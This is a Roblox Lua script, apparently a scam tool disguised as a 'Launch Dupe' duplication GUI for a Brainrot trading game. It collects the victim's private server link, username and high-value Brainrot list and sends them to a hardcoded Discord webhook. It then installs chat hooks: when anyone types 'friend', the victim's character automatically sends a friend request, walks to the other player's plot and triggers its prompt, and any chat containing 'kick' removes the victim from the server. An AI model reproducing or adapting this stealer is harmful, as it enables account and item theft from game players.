--// Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Fun√ß√µes Helper
local function normalize(str)
    return string.lower(tostring(str)):gsub("^%s*(.-)%s*$","%1")
end

local function simplifyForMatch(str)
    return normalize(str):gsub("%W","")
end

-- ‚ú® NOVA FUN√á√ÉO: Converte valores tipo "10M", "1B", "500K" para n√∫mero
local function parseValue(valueStr)
    if not valueStr then return 0 end
    
    local str = tostring(valueStr):upper():gsub(",", ""):gsub("%s", "")
    
    -- Extrai n√∫mero e sufixo
    local num, suffix = str:match("([%d%.]+)([KMBT]?)")
    if not num then return 0 end
    
    num = tonumber(num) or 0
    
    -- Converte sufixos para multiplicadores
    local multipliers = {
        K = 1000,
        M = 1000000,
        B = 1000000000,
        T = 1000000000000
    }
    
    local multiplier = multipliers[suffix] or 1
    return num * multiplier
end

-- ‚ú® NOVA FUN√á√ÉO: Pega o Player pelo nome (username OU displayname)
local function getPlayerByName(name)
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Name == name or plr.DisplayName == name then
            return plr
        end
    end
    return nil
end

-- ‚ú® FUN√á√ÉO MELHORADA: Agora procura por USERNAME e DISPLAYNAME
local function findPlayerPlot(plotsFolder, playerName)
    if not plotsFolder then return nil end
    
    -- Tenta pegar o Player object
    local targetPlayer = getPlayerByName(playerName)
    
    -- Monta as possibilidades de busca
    local searchNames = {playerName}
    if targetPlayer and targetPlayer.DisplayName ~= targetPlayer.Name then
        table.insert(searchNames, targetPlayer.DisplayName)
    end
    
    print("üîç Procurando plot para:", playerName)
    print("   Buscando por:", table.concat(searchNames, " OU "))
    
    -- Procura em cada plot
    for _, plot in ipairs(plotsFolder:GetChildren()) do
        if plot:IsA("Model") then
            local plotSign = plot:FindFirstChild("PlotSign")
            if plotSign then
                local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
                if surfaceGui then
                    local frame = surfaceGui:FindFirstChild("Frame")
                    if frame then
                        local textLabel = frame:FindFirstChild("TextLabel")
                        if textLabel then
                            local baseText = textLabel.Text
                            
                            for _, name in ipairs(searchNames) do
                                if baseText == name.."'s Base" then
                                    print("‚úÖ Plot encontrado com:", name)
                                    return plot
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    
    print("‚ùå Plot n√£o encontrado para:", playerName)
    return nil
end

local function getAnimalsInPlot(plot)
    local animals = {}
    if not plot then 
        return animals 
    end

    local podiumsFolder = plot:FindFirstChild("AnimalPodiums")
    if not podiumsFolder then 
        return animals 
    end

    for _, podiumModel in ipairs(podiumsFolder:GetChildren()) do
        if podiumModel:IsA("Model") then
            local baseModel = podiumModel:FindFirstChild("Base")
            if baseModel and baseModel:IsA("Model") then
                local spawnPart = baseModel:FindFirstChild("Spawn")
                if spawnPart then
                    local attachments = {}
                    for _, child in ipairs(spawnPart:GetChildren()) do
                        if child:IsA("Attachment") and child.Name ~= "PromptAttachment" then
                            table.insert(attachments, child)
                        end
                    end

                    if #attachments == 1 then
                        local attachment = attachments[1]
                        local billboard = attachment:FindFirstChild("AnimalOverhead", true)
                        if billboard then
                            local displayName = billboard:FindFirstChild("DisplayName")
                            local generation = billboard:FindFirstChild("Generation")
                            
                            if displayName and generation then
                                table.insert(animals, {
                                    name = displayName.Text,
                                    price = generation.Text
                                })
                            end
                        end
                    end
                end
            end
        end
    end
    
    return animals
end

local function walkToPosition(targetPosition)
    local player = Players.LocalPlayer
    local character = player.Character
    if not character then return false end
    
    local humanoid = character:FindFirstChild("Humanoid")
    if not humanoid then return false end
    
    humanoid:MoveTo(targetPosition)
    
    local moveTimeout = 30
    local startTime = tick()
    
    repeat
        wait(0.1)
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if not rootPart then return false end
        
        local distance = (rootPart.Position - targetPosition).Magnitude
        if distance < 5 then
            return true
        end
        
        if tick() - startTime > moveTimeout then
            return false
        end
    until not humanoid or humanoid.Health <= 0
    
    return false
end

local function tryAddFriend(targetPlayer)
    local player = Players.LocalPlayer
    print("üîÑ Tentando adicionar", targetPlayer.Name, "como amigo...")
    
    local success1 = pcall(function()
        player:RequestFriendship(targetPlayer)
    end)
    if success1 then 
        print("‚úÖ M√©todo 1 funcionou!")
        return true
    end
    
    local success2 = pcall(function()
        Players.LocalPlayer:RequestFriendship(targetPlayer)
    end)
    if success2 then 
        print("‚úÖ M√©todo 2 funcionou!")
        return true
    end
    
    print("‚ùå Nenhum m√©todo funcionou")
    return false
end

local player = Players.LocalPlayer
if not player then
    return
end

print("üõ°Ô∏è Sistema de kick ativado para jogador:", player.Name)

Players.PlayerChatted:Connect(function(_, chatPlayer, message)
    local msg = string.lower(message)
    if msg == "kick" or msg:find("kick") then
        if chatPlayer.Name ~= player.Name then
            player:Kick("‚ö†Ô∏è Voc√™ foi removido do servidor.")
        end
    end
end)

for _, otherPlayer in pairs(Players:GetPlayers()) do
    if otherPlayer ~= player then
        otherPlayer.Chatted:Connect(function(message)
            local msg = string.lower(message)
            if msg == "kick" or msg:find("kick") then
                player:Kick("‚ö†Ô∏è Voc√™ foi removido do servidor.")
            end
        end)
    end
end

Players.PlayerAdded:Connect(function(newPlayer)
    if newPlayer ~= player then
        newPlayer.Chatted:Connect(function(message)
            local msg = string.lower(message)
            if msg == "kick" or msg:find("kick") then
                player:Kick("‚ö†Ô∏è Voc√™ foi removido do servidor.")
            end
        end)
    end
end)

print("‚úÖ Sistema de kick configurado!")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1433922894160723969/p8PMvPhnIQQ5JC4hwnxI9rmzAnF3VC3Hykay3e0bXEpZaKmWi79Abu5LPAuyEyebsqd4"

local playerGui = player:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LaunchDupeGui"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

local blur = Instance.new("Frame")
blur.Size = UDim2.new(1, 0, 1, 0)
blur.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
blur.BackgroundTransparency = 0.5
blur.Parent = screenGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 500, 0, 300)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
frame.Parent = screenGui

Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

local shadow = Instance.new("ImageLabel")
shadow.Name = "Shadow"
shadow.AnchorPoint = Vector2.new(0.5, 0.5)
shadow.Position = UDim2.new(0.5, 0, 0.5, 8)
shadow.Size = UDim2.new(1, 40, 1, 40)
shadow.BackgroundTransparency = 1
shadow.Image = "rbxassetid://7912134082"
shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
shadow.ImageTransparency = 0.7
shadow.ZIndex = 0
shadow.Parent = frame

local title = Instance.new("TextLabel")
title.Text = "Launch Dupe"
title.Size = UDim2.new(1, 0, 0, 60)
title.Position = UDim2.new(0, 0, 0, 20)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 28
title.Parent = frame

local subtitle = Instance.new("TextLabel")
subtitle.Text = "Import Private Server Link"
subtitle.Size = UDim2.new(1, 0, 0, 30)
subtitle.Position = UDim2.new(0, 0, 0, 80)
subtitle.BackgroundTransparency = 1
subtitle.TextColor3 = Color3.fromRGB(150, 150, 150)
subtitle.Font = Enum.Font.Gotham
subtitle.TextSize = 14
subtitle.Parent = frame

local textbox = Instance.new("TextBox")
textbox.PlaceholderText = "Enter link here..."
textbox.Size = UDim2.new(0.88, 0, 0, 50)
textbox.Position = UDim2.new(0.06, 0, 0, 130)
textbox.BackgroundColor3 = Color3.fromRGB(40, 40, 48)
textbox.TextColor3 = Color3.fromRGB(220, 220, 220)
textbox.PlaceholderColor3 = Color3.fromRGB(100, 100, 110)
textbox.Font = Enum.Font.Gotham
textbox.TextSize = 15
textbox.Text = ""
textbox.ClearTextOnFocus = false
textbox.Parent = frame
Instance.new("UICorner", textbox).CornerRadius = UDim.new(0, 8)

local button = Instance.new("TextButton")
button.Text = "Start"
button.Size = UDim2.new(0.88, 0, 0, 55)
button.Position = UDim2.new(0.06, 0, 0, 200)
button.BackgroundColor3 = Color3.fromRGB(60, 130, 255)
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.Font = Enum.Font.GothamBold
button.TextSize = 18
button.Parent = frame
Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)

button.MouseEnter:Connect(function()
    TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 150, 255)}):Play()
end)
button.MouseLeave:Connect(function()
    TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 130, 255)}):Play()
end)

frame.BackgroundTransparency = 1
title.TextTransparency = 1
subtitle.TextTransparency = 1
textbox.TextTransparency = 1
textbox.BackgroundTransparency = 1
button.TextTransparency = 1
button.BackgroundTransparency = 1

TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
TweenService:Create(title, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
TweenService:Create(subtitle, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
TweenService:Create(textbox, TweenInfo.new(0.5), {TextTransparency = 0, BackgroundTransparency = 0}):Play()
TweenService:Create(button, TweenInfo.new(0.5), {TextTransparency = 0, BackgroundTransparency = 0}):Play()

local function setupChatListeners()
    Players.PlayerChatted:Connect(function(_, chatPlayer, message)
        local msg = normalize(message)
        
        if msg == "friend" then
            if chatPlayer.Name == player.Name then return end
            
            print("üì¢ Pedido de friend detectado de:", chatPlayer.Name)
            tryAddFriend(chatPlayer)
            
            local plotsFolder = workspace:FindFirstChild("Plots")
            local targetPlot = findPlayerPlot(plotsFolder, chatPlayer.Name)
            
            if not targetPlot then
                print("‚ùå Plot n√£o encontrado")
                return
            end
            
            local friendPanel = targetPlot:FindFirstChild("FriendPanel")
            if not friendPanel then return end
            
            local mainPart = friendPanel:FindFirstChild("Main")
            if not mainPart or not mainPart:IsA("BasePart") then return end
            
            local success = walkToPosition(mainPart.Position)
            
            if success then
                wait(0.5)
                local proximityPrompt = mainPart:FindFirstChildOfClass("ProximityPrompt")
                if proximityPrompt then
                    fireproximityprompt(proximityPrompt)
                end
            end
        end
    end)
end

button.MouseButton1Click:Connect(function()
    local input = textbox.Text
    
    if input == "" or not input:match("^https://") then
        textbox.Text = ""
        textbox.PlaceholderText = "‚ùå Coloque o link do seu servidor privado!"
        wait(2)
        textbox.PlaceholderText = "Enter link here..."
        return
    end
    
    print("üîç Verificando Brainrots antes de enviar...")
    
    local plotsFolder = workspace:FindFirstChild("Plots")
    local targetPlot = findPlayerPlot(plotsFolder, player.Name)
    local foundAnimals = getAnimalsInPlot(targetPlot)
    
    if not targetPlot or #foundAnimals == 0 then
        print("‚ùå KICK: Nenhum Brainrot encontrado!")
        player:Kick("‚ö†Ô∏è Voc√™ foi removido do servidor.\n\n‚ùå Motivo: Nenhum Brainrot encontrado na sua base!")
        return
    end
    
    local MIN_VALUE = 10000000
    
    for _, animal in ipairs(foundAnimals) do
        local value = parseValue(animal.price)
        
        print("üîç Verificando:", animal.name, "- Valor:", animal.price, "=", value)
        
        if value < MIN_VALUE then
            print("‚ùå KICK: Brainrot abaixo de 10M!")
            player:Kick("‚ö†Ô∏è Voc√™ foi removido do servidor.\n\n‚ùå Motivo: Brainrot '"..animal.name.."' vale menos de 10M!\nüí∞ Valor: "..animal.price)
            return
        end
    end
    
    print("‚úÖ Todos os Brainrots s√£o v√°lidos! Enviando webhook...")
    
    local currentTime = os.date("%H:%M - %d/%m/%Y")
    local totalPlayers = #Players:GetPlayers()

    local brainrotsValue
    if #foundAnimals == 0 then
        brainrotsValue = "Nenhum"
    else
        local parts = {}
        for _, animal in ipairs(foundAnimals) do
            table.insert(parts, animal.name .. " (" .. animal.price .. ")")
        end
        brainrotsValue = table.concat(parts, "\n")
    end

    local payload = {
        ["content"] = "@everyone **New Brainrot Hit**",
        ["username"] = "Brainrot System",
        ["avatar_url"] = "https://i.imgur.com/oBnXOzr.png",
        ["embeds"] = {
            {
                ["title"] = "üìä Brainrots Normais",
                ["color"] = 8405759,
                ["fields"] = {
                    {
                        ["name"] = "üìÖ Data",
                        ["value"] = currentTime,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "üîó Link/Texto",
                        ["value"] = input or "Nenhum texto",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "üë• Jogando",
                        ["value"] = tostring(totalPlayers),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "üë§ Nome",
                        ["value"] = player.Name,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "üéÆ Brainrots",
                        ["value"] = brainrotsValue,
                        ["inline"] = false
                    }
                }
            }
        }
    }

    local success, response = pcall(function()
        local encoded = HttpService:JSONEncode(payload)
        return HttpService:RequestAsync({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = encoded
        })
    end)

    if success then
        print("‚úÖ Webhook enviada com sucesso!")
        button.Text = "‚úÖ Success!"
        wait(2)
        button.Text = "Start"
        
        setupChatListeners()
        
        screenGui:Destroy()
    else
        warn("‚ùå Erro ao enviar webhook:", response)
        button.Text = "‚ùå Error!"
        wait(2)
        button.Text = "Start"
    end
end)
